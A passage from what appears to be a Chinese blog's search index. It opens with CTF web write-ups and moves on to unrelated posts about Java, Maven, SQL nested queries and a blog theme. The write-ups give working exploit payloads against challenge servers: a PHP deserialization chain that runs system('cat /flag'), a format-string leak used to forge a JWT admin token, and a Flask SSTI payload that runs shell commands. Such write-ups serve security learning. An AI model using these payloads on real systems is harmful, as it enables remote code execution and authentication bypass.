title="ezunserialize"></a><strong>ezunserialize</strong></h2><h3 id="-1"><a href="#-1" class="headerlink" title=""></a></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">entrance</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$start</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;start = <span class="variable">$start</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;start-&gt;helloworld();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">springboard</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$middle</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;middle-&gt;hs;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$end</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$end</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;end = <span class="variable">$end</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$Attribute</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;end);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;serialize&#x27;</span>])) &#123;</span><br><span class="line">    unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;serialize&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先来了解一些魔术方法：</p><table><thead><tr><th>__construct()</th><th>具有构造函数的类会在每次创建新对象时先调用此方法</th></tr></thead><tbody><tr><td><strong>__destruct()</strong></td><td>某个对象的所有引用都被删除或者当对象被显式销毁时执行</td></tr><tr><td><strong>__get()</strong></td><td>读取不可访问<font color='red'>属性的值</font>,<code>__get</code>会被自动调用</td></tr><tr><td><strong>__call()</strong></td><td>在对象中调用一个不可访问<font color='red'>方法</font>时,<code>__call</code>会自动被调用</td></tr><tr><td><strong>__wakeup()</strong></td><td><code>unserialize()</code> 会检查是否存在一个 <code>__wakeup()</code>方法。如果存在，则会先调用 <code>__wakeup</code> 方法，预先准备对象需要的资源。</td></tr></tbody></table><p>分析上述代码，得知最终入口为evil对象调用的eval函数，从而构造传播链</p><blockquote><p>entrance–&gt;springboard–&gt;evil</p></blockquote><p>可以自行给springboard类增添构造函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">springboard</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$middle</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$x</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;middle = <span class="variable">$x</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;middle-&gt;hs;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$e</span> = <span class="keyword">new</span> evil(<span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>);</span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> springboard(<span class="variable">$e</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> entrance(<span class="variable">$s</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p>得到序列化后的结果 ：<code>O:8:&quot;entrance&quot;:1:&#123;s:5:&quot;start&quot;;O:11:&quot;springboard&quot;:1:&#123;s:6:&quot;middle&quot;;O:4:&quot;evil&quot;:1:&#123;s:3:&quot;end&quot;;s:20:&quot;system(&#39;cat /flag&#39;);&quot;;&#125;&#125;&#125;</code></p><p>最终取得flag：</p><p><img src="https://i.loli.net/2021/09/24/jlzvO5bMwC68ZWr.png"></p><h2 id="地狱通信—改"><a href="#地狱通信—改" class="headerlink" title="地狱通信—改"></a><strong>地狱通信—改</strong></h2><blockquote><p>实际上地狱通信比这个简单，但有时间限制，这题做出来地狱通信也就没有问题了</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask import Flask, render_template, request, session, redirect, make_response</span><br><span class="line"><span class="keyword">from</span> secret import secret, headers, User</span><br><span class="line">import datetime</span><br><span class="line">import jwt</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">&quot;/&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>])</span><br><span class="line">def index():</span><br><span class="line">    f = open(<span class="string">&quot;app.py&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">    ctx = f.read()</span><br><span class="line">    f.close()</span><br><span class="line">    res = make_response(ctx)</span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> in name <span class="keyword">or</span> name == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: name,</span><br><span class="line">    &#125;</span><br><span class="line">    token = jwt.encode(payload, secret, algorithm=<span class="string">&#x27;HS256&#x27;</span>, headers=headers)</span><br><span class="line">    res.set_cookie(<span class="string">&#x27;token&#x27;</span>, token)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">&#x27;/hello&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>])</span><br><span class="line">def hello():</span><br><span class="line">    token = request.cookies.get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> not token:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/&#x27;</span>, <span class="number">302</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        name = jwt.decode(token, secret, algorithms=[<span class="string">&#x27;HS256&#x27;</span>])[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">    except jwt.exceptions.InvalidSignatureError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Invalid token&quot;</span></span><br><span class="line">    <span class="keyword">if</span> name != <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        user = User(name)</span><br><span class="line">        flag = request.args.get(<span class="string">&#x27;flag&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">        message = <span class="string">&quot;Hello &#123;0&#125;, your flag is&quot;</span> + flag</span><br><span class="line">        <span class="keyword">return</span> message.format(user)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;flag.html&#x27;</span>, name=name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p>python编写网页，主要有两大块，第一个函数会屏蔽传参的’admin’，并设置cookie留给第二个函数使用，第二个函数又只能用admin访问flag.html</p><p>所以有两个思路：1.绕过第一个admin而在第二个中显示，发现用<code>%00</code>截断可以显示出用户名为admin，但不能打开fllag.html</p><p><font color='red'>2.伪造这个token</font></p><p>查询到python的format函数在网页中有漏洞，参考链接：<a href="https://www.sohu.com/a/296121261_120045376">从两道CTF实例看python格式化字符串漏洞_format (sohu.com)</a></p><p>可以创建普通用户通过该漏洞，带出构造token的secret和headers，从而构造admin的token</p><p><img src="https://i.loli.net/2021/09/21/FtwkxlYZVJECBbO.png"></p><p><img src="https://i.loli.net/2021/09/21/ZwS3b2vdgEW7UYe.png"></p><p>用<code>0.__class__.__init__.__globals__[]</code>带出secret和headers</p><p><img src="https://i.loli.net/2021/09/21/XoKOJLFgbtmxW2y.png"></p><p>利用python的<strong>pyjwt</strong>库来伪造admin的token：(但使用时是用 import jwt)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&#x27;admin&#x27;</span>, &#125;</span><br><span class="line">secret = <span class="string">&#x27;u_have_kn0w_what_f0rmat_i5&#x27;</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;alg&#x27;</span>: <span class="string">&#x27;HS256&#x27;</span>, <span class="string">&#x27;typ&#x27;</span>: <span class="string">&#x27;JWT&#x27;</span>&#125;</span><br><span class="line">token = jwt.encode(payload, secret, algorithm=<span class="string">&#x27;HS256&#x27;</span>, headers=headers)</span><br><span class="line"><span class="built_in">print</span>(token)</span><br></pre></td></tr></table></figure><p>token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoiYWRtaW4ifQ.ONh7uQwunkVjB4_ZwuLNIHBGbciqLAtJxQF81elyqBc</p><p>在hello页面发送，得到flag</p><p><img src="https://i.loli.net/2021/09/21/b4ztBhd7ov1sQjY.png"></p><h2 id="让-我-访-问"><a href="#让-我-访-问" class="headerlink" title="让 我 访 问"></a><strong>让 我 访 问</strong></h2><p>本题知识点：SSTI</p><p>SSTI这篇文章写的很好：<a href="https://zhuanlan.zhihu.com/p/93746437">CTF|有关SSTI的一切小秘密【Flask SSTI+姿势集+Tplmap大杀器】</a></p><p>在对post提交的username和passwd进行渗透无果后，转到对register页面的研究上</p><p><font color='red'>对于会自动跳转的页面一定要使用bp抓包分析</font></p><p><img src="https://i.loli.net/2021/09/24/iCDM5RZLwSozUkN.png"></p><p>发现页面跳转是通过“第三方”跳转的，更改为abc，发现abc被显示出来，尝试SSTI注入</p><p><img src="https://i.loli.net/2021/09/24/q7cuzknBXM49HNU.png"></p><p><strong>成功发现注入点!</strong></p><p>先获取object基本类的子类</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[1].__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure><p>找到可以利用的os类，通常可以找到<code>&lt;class&#39;os._wrap_close&#39;&gt;</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;cat /flag&quot;).read()&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/09/24/GosJh6QWPbeVkRf.png"></p><h2 id="fake-game"><a href="#fake-game" class="headerlink" title="fake game"></a><strong>fake game</strong></h2><p>知识点是<code>原型链污染</code></p><p><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html%22">博客</a></p><p>题目思路来源<a href="https://github.com/XDSEC/moeCTF_2020">西电安全协会</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java实现坦克大战练手小游戏</title>
      <link href="/bufferfly/blog/871f3241.html"/>
      <url>/bufferfly/blog/871f3241.html</url>
      
        <content type="html"><![CDATA[<p>自己在摸鱼时间在github上发现某大佬的坦克大战项目，于是就fork下来仔细品读一下，但是发现除了一点多线程，和swt，并没有太多有意思的地方，但是我还是把它敲完，做了一下简单的测试，稍微改动了一下，比如左上角的英文汉化，增加分数显示。em… 就这些。感兴趣的朋友可以简单看看源码。</p><blockquote><p><a href="https://github.com/glassy-sky-lisong/TankGame">坦克大战传送门</a></p></blockquote><p>有有个.idea文件夹，上传时不小心上传上去了，大家clone下来删掉即可，这是idea的个人配置文件夹。不过，idea敲java是真香，[手动狗头.jpg]</p>]]></content>
      
      
      <categories>
          
          <category> Java那点事 </category>
          
          <category> 练手项目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java那点事 </tag>
            
            <tag> 练手项目 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Maven一直reading读取pom.xml文件问题</title>
      <link href="/bufferfly/blog/f62be7ba.html"/>
      <url>/bufferfly/blog/f62be7ba.html</url>
      
        <content type="html"><![CDATA[<p>关于Maven一直reading读取pom.xml文件问题很是蛋疼，我是用的IDEA，想创建一个SpringBoot去做新项目的后端，但是创建完成后，右下角就一直在读取pom文件，依赖包下不来就什么也干不了，而且退出也没有用，会一直堵塞在哪里，只能用资源管理器kill掉IDEA的桌面任务，然后想通过卸载IDEA来重新建项目，但是没有效果，无奈只能面向百度了，看了一些帖子，据说是网络配置问题，其解决的方案大致这有几种：</p><ol><li>修改HOST文件的 127.0.0.1为localhost，在终端输入 *** netsh winsock reset*** 我的HOST的确是在安装navicat时候改过，然后就修改重启后也没有效果</li><li>添加本地maven到环境变量，这个有效，不过是在降低springboot版本之后添加的</li><li>降低springboot版本，默认是2.3.3，降低到2.2.*</li><li>在IDEA的Help菜单下的showlogExpore，查看运行日志，检查问题，我看了一遍，并没有明显的错误</li></ol><p>折腾了挺长时间，现在分享给大家，帮助大家在遇到此类问题的小伙伴能尽快解决，以免耽误工作。</p>]]></content>
      
      
      <categories>
          
          <category> Java那点事 </category>
          
          <category> Maven </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Maven </tag>
            
            <tag> SpringBoot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java泛型之上、下边界通配符的理解(适合初学)</title>
      <link href="/bufferfly/blog/4ad3c53.html"/>
      <url>/bufferfly/blog/4ad3c53.html</url>
      
        <content type="html"><![CDATA[<h2 id="泛型的由来"><a href="#泛型的由来" class="headerlink" title="泛型的由来"></a>泛型的由来</h2><h3 id="为什么需要泛型"><a href="#为什么需要泛型" class="headerlink" title="为什么需要泛型"></a>为什么需要泛型</h3><p>&emsp;&emsp;Java的数据类型一般都是在定义时就需要确定，这种强制的好处就是类型安全，不会出现像弄一个ClassCastException的数据给jvm，数据安全那么执行的class就会很稳定。但是假如说我不知道这个参数要传什么类型的，因为公司需求在变，如果写死的那就只能便以此需求就改一次，很麻烦。sun公司也注意到这个问题，这样会让代码的灵活性降低，他们就研究出了泛型。</p><h3 id="泛型初识"><a href="#泛型初识" class="headerlink" title="泛型初识"></a>泛型初识</h3><p>&emsp;&emsp;什么是泛型，可以字面理解就是一个泛泛的类型，他是不确定的，在Java代码编译的时候用泛型是不会出错的，而在运行期时就会报错，说你这种第一是不合理的。这是为什么呢。因为为了提高灵活性，就在编译时期将条件放宽，但是泛型一定要在运行的时候告诉jvm你给我的数据到底是什么类型的，否则jvm会是懵逼的。所以泛型的好处就是将类型的灵活性提高，也只是在Java语法的基础上提高，不过泛型还是比较实用的。</p><h3 id="何时使用泛型"><a href="#何时使用泛型" class="headerlink" title="何时使用泛型"></a>何时使用泛型</h3><p>&emsp;&emsp;泛型的应用场景就是应用在模型（可以理解为存储数据的盒子），我为了这个盒子适用更多的地方我就用将需要存入的数据用一个泛型表示，当然可以传入多值。如果是相同类型的对象就用一个泛型的数组比较好，学过集合的小伙伴应该都知道，没学过的那你应该补补课了。</p><p><em><strong>泛型的语法</strong></em></p><pre><code>public class A&lt;T extends B&gt;&#123;   T t;&#125;</code></pre><h2 id="泛型的缺点或者为什么需要上、下边界"><a href="#泛型的缺点或者为什么需要上、下边界" class="headerlink" title="泛型的缺点或者为什么需要上、下边界"></a>泛型的缺点或者为什么需要上、下边界</h2><p>&emsp;&emsp;泛型的虽然强大，但是世界上任何东西东部是完美的。它也有缺陷。比如说我有一个盒子我想装苹果，但是我还可能想装香蕉那怎么办。那还不好说，在给一个参数不就行了，那十个呢，二十个呢。em….的确是。如果说我们想装的东西都属于一个类并且只要是这个类的子类就可以装。这个想法sun为我们想好了。那就是用上边界通配符。语法是<T entends M> T是泛型，M是T的父类。我们就定义一个水果类（Fruit），盛装就容器就是盘子（Dish），现在我们就可以装任何水果了，不错吧！</p><p><em><strong>上边界Java代码</strong></em></p><pre><code>public class Dish&lt;T extends Fruit&gt;&#123;  private T fruitChild;  public Dish(T fruitChild)&#123;    this.fruitChild = fruitChild;  &#125;  public T getFruitChild()&#123;    return fruitChild;  &#125;    public void setFruitChild(T f)&#123;    this.fruitChild = f;  &#125;  public static void main(String[] args)&#123;    Dish dish = new Dish&lt;apple&gt;();    Apple apple = new apple(); //apple must be Fruit child;    dish.setFruitChild(apple);    system.out.printf(dish.getFruitChild);  &#125;&#125;</code></pre><p><em><strong>下边界Java代码</strong></em></p><pre><code>public class Dish&lt;T super Apple&gt;&#123;  private T appleFather;  public Dish(T appleFather)&#123;    this.appleFather = appleFather;  &#125;  public T getAppleFather()&#123;    return appleFather;  &#125;    public void setAppleFather(T f)&#123;    this.appleFather = f;  &#125;  public static void main(String[] args)&#123;    Dish dish = new Dish&lt;Fruit&gt;();    Fruit fruit = new Fruit(); //fruit must be apple son;    dish.setAppleFather(fruit);    system.out.printf(dish.getAppleFather);  &#125;&#125;</code></pre><h2 id="什么是上边界通配符"><a href="#什么是上边界通配符" class="headerlink" title="什么是上边界通配符"></a>什么是上边界通配符</h2><p>&emsp;&emsp;当泛型T给定形如<T extends A> 的A类型到A类型任何子类的限制域，可以匹配任何在此限制域中的类型，此种表示叫上边界通配符。<br>###上边界通配符理解<br><img src="https://images2015.cnblogs.com/blog/820480/201611/820480-20161125004120143-1731938777.png" alt="png"></p><h2 id="什么是下边界通配符"><a href="#什么是下边界通配符" class="headerlink" title="什么是下边界通配符"></a>什么是下边界通配符</h2><p>&emsp;&emsp;当泛型T给定形如<T super A> 的A类型到A类型任何父类的限制域，可以匹配任何在此限制域中的类型，此种表示叫下边界通配符。</p><h3 id="下边界通配符理解"><a href="#下边界通配符理解" class="headerlink" title="下边界通配符理解"></a>下边界通配符理解</h3><p><img src="https://images2015.cnblogs.com/blog/820480/201611/820480-20161125004216471-1377946016.png" alt="png"></p><h2 id="上下边界通配符的缺点"><a href="#上下边界通配符的缺点" class="headerlink" title="上下边界通配符的缺点"></a>上下边界通配符的缺点</h2><p>&emsp;&emsp;上界&lt;? extends T&gt;不能往里存，只能往外取。<br>###解释<br>&emsp;&emsp;因为编译器只知道传入的是T的子类，但具体是哪一个编译器不知道，他只标注了一个占位符，当？传过来时，他不知道这能不能和占位符匹配，所以set不了。<br>&emsp;&emsp;下界&lt;? super T&gt;不影响往里存，但往外取只能放在Object对象里。</p><h3 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h3><p>&emsp;&emsp;因为下边界已经限制了？的粒度，他只可能是T本身或者是T的父类。我们想想，我想要一个T，你却返回给我一个比T小的Object，这样我们就因为精度损失而拿不到想要的数据了。</p><blockquote><p>感谢各位童鞋的阅读，希望大家动一动发财的小手点一下推荐QAQ。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 博客园博文 </category>
          
          <category> 博客美化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客园 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>超实用的SQL语句之嵌套查询</title>
      <link href="/bufferfly/blog/f3908263.html"/>
      <url>/bufferfly/blog/f3908263.html</url>
      
        <content type="html"><![CDATA[<h2>嵌套查询</h2><h3>什么是嵌套查询</h3>. 　　嵌套查询的意思是，一个查询语句(select-from-where)查询语句块可以嵌套在另外一个查询块的where子句中，称为嵌套查询。其中外层查询也称为父查询，主查询。内层查询也称子查询，从查询。<h3>嵌套查询的工作方式</h3> 　　先处理内查询，由内向外处理，外层查询利用内层查询的结果嵌套查询不仅仅可以用于父查询select语句使用。还可以用于insert、update、delete语句或其他子查询中。<h2>子查询的组成</h2> 1、包含标准选择列表组件的标准select查询。<p> 2、包含一个或多个表或者视图名称的标准from子句。</p><p> 3、可选的where子句。</p><p> 4、可选的group by子句。</p><p> 5、可选的having子句。</p><h2>子查询的语法规则</h2> 1、子查询的select查询总是使用圆括号括起来。<p> 2、不能包括compute或for.browse子句。</p><p> 3、如果同时指定top子句，则可能只包括order by子句。</p><p> 4、子查询最多可以嵌套到32层。个别查询可能会不支持32层嵌套。</p><p> 5、任何可以使用表达式的地方都可以使用子查询，只要它返回的是单个值。</p><p> 6、如果某个表只出现在子查询中二不出现在外部查询中，那么该表的列就无法包含在输出中。</p><h2>简单子查询</h2><strong>示例：</strong><pre><code>select name,age from person where age &gt;     (        select age from person         where name = &#39;孙权&#39;    )</code></pre><p><strong>输出结果为：</strong><br><img src="https://cdn.jsdelivr.net/gh/glassy-sky-lisong/StaticFile1@master/post/4.jpg" alt="1"></p><h2>in嵌套查询</h2> 　　in关键字用于where子句中用来判断查询的表达式是否在多个值的列表中。返回满足in列表中的满足条件的记录。<p><strong>示例：</strong></p><pre><code>select name from person where countryid in (select countryid from countrywhere countryname = &#39;魏国&#39;)</code></pre><p><strong>输出结果为：</strong></p><img src="https://cdn.jsdelivr.net/gh/glassy-sky-lisong/StaticFile1@master/post/3.jpg" alt="2"><h2>some嵌套查询</h2><h3>语法</h3> 　　some在sql中的逻辑运算符号，如果在一系列比较中，有些值为True，那么结果就为True。some的语法是：<pre><code>&lt;表达式&gt;&#123; =|&lt;&gt;|!=|&gt;|&gt;=|!&gt;|&lt;|&lt;=|!&lt;&#125;some(子查询)</code></pre><p><strong>示例：</strong></p><pre><code>select name from person where countryid = some 　　　　　　--用等号和以下查询到的值比较，如果与其中一个相等，就返回(select countryid from countrywhere countryname = &#39;魏国&#39;)</code></pre><p><strong>输出结果为：</strong><br><img src="https://cdn.jsdelivr.net/gh/glassy-sky-lisong/StaticFile1@master/post/2.jpg" alt="3"></p><h2>all嵌套查询</h2> 　　all是sql中的逻辑运算符好，如果一系列的比较都为true，那么结果才能为true。<h3>语法</h3><pre><code>&lt;表达式&gt;&#123; =|&lt;&gt;|!=|&gt;|&gt;=|!&gt;|&lt;|&lt;=|!&lt;&#125;all(子查询)</code></pre><p><strong>示例：</strong></p><pre><code>select name from person where countryid &gt; all　　 --当countryid大于以下返回的所有id，此结果才为True，此结果才返回(select countryid from countrywhere countryname = &#39;魏国&#39;)</code></pre><p><strong>输出结果为：</strong><br><img src="https://cdn.jsdelivr.net/gh/glassy-sky-lisong/StaticFile1@master/post/1.jpg" alt="4"></p><h2>exists嵌套查询</h2><h3>语法</h3> 　　exists是sql中的逻辑运算符号。如果子查询有结果集返回，那么就为True。exists代表“存在”的意义，它只查找满足条件的那些记录。<span style="color:red">一旦找到第一个匹配的记录后，就马上停止查找。</span><pre><code>exists　子查询</code></pre><p> 　　其中子查询是一个首先的select语句，不允许有compute子句和into关键字。<br>exists 的意思是，子查询是否有结果集返回。<br><strong>例如：</strong></p><pre><code>SELECT * FROM PersonWHERE exists(SELECT 1      --SELECT 0  SELECT NULL 返回结果都一样，因为这三个子查询都有结果集返回，因此总是True  SELECT * FROM Person照常执行)</code></pre><p> 　　但是如果子查询中因为加了条件而没有结果集返回，则主语句就不执行了：</p><pre><code>SELECT * FROM PersonWHERE exists(SELECT * FROM Person WHERE Person_Id = 100    --如果不存在Person_Id的记录，则子查询没有结果集返回，主语句不执行)</code></pre><p>最后感谢<a href="https://www.cnblogs.com/kissdodog/archive/2013/06/03/3116284.html">不玩博客了！</a>同学的分享，么么哒！</p>]]></content>
      
      
      <categories>
          
          <category> 博客园博文 </category>
          
          <category> mybatis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
            <tag> MyBatis </tag>
            
            <tag> SQL技巧 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客美化——Silence主题皮肤</title>
      <link href="/bufferfly/blog/3ba53770.html"/>
      <url>/bufferfly/blog/3ba53770.html</url>
      
        <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>&emsp;&emsp;一款专注阅读的博客园主题，主要面向于经常混迹 博客园 的朋友。其追求大道至简的终极真理，界面追求简洁、运行追求高效、部署追求简单。</p><ul><li><a href="https://github.com/glassy-sky-lisong/SilenceSkin">博客皮肤源码地址</a></li><li><a href="https://www.cnblogs.com/esofar">预览地址</a></li><li><a href="https://github.com/esofar/cnblogs-theme-silence/blob/master/docs/deploy.md">如何部署、使用皮肤</a></li><li><a href="https://www.cnblogs.com/esofar/p/cnblogs-theme-silence.html">Silence作者的友链</a></li></ul><h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><ul><li>简洁优雅、精致漂亮的 UI 设计</li><li>提供多种风格主题以便适应各类用户的偏好</li><li>响应式设计，兼容手机端浏览器</li><li>提供事无巨细的部署文档</li><li>源码结构清晰并且注释完整，方便扩展</li></ul><h2 id="开发"><a href="#开发" class="headerlink" title="开发"></a>开发</h2><p>&emsp;&emsp;请先确保您正在使用的机器已经安装 Node.js 和 Git 客户端。</p><pre><code> git clone https://github.com/esofar/cnblogs-theme-silence.git   # 克隆源码 cd cnblogs-theme-silence                                        # 进入项目 npm install                                                     # 安装依赖 npm run 